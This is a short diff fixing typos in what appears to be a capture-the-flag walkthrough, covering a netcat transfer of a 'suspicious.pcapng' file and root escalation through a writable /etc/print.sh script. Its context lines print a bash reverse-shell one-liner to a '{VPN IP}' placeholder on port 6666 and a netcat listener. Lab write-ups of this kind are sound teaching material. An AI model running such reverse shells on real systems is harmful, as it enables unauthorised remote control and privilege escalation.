@@ -230,7 +230,7 @@ $
 Looking through, we found a user called "lennie" in the /home directory, which can be used to stablish a ssh connection.
 Unfortunately, we dont have the password. So lets keep looking:
 
-If we check the root directory again, we can see that as www-data user we have access to a file called "incidents", whichis a wireshark file. Lets download get in into our local machine with the following command:
+If we check the root directory again, we can see that as www-data user we have access to a file called "incidents", which is a wireshark file. Lets download get it into our local machine with the following command:
 
 ```shell
 nc -lvpn 1234 > suspicious.pcapng {In our local machine}
@@ -278,7 +278,7 @@ Lets just cd /etc directory and nano print.sh and add the following command:
 bash -i >& /dev/tcp/{VPN IP}/6666 0>&1 
 ```
 
-If yo done it correctly, you are now root using a reverse shell
+If you done it correctly, you are now root using a reverse shell
 
 ```ruby
 listening on [any] 6666 ...
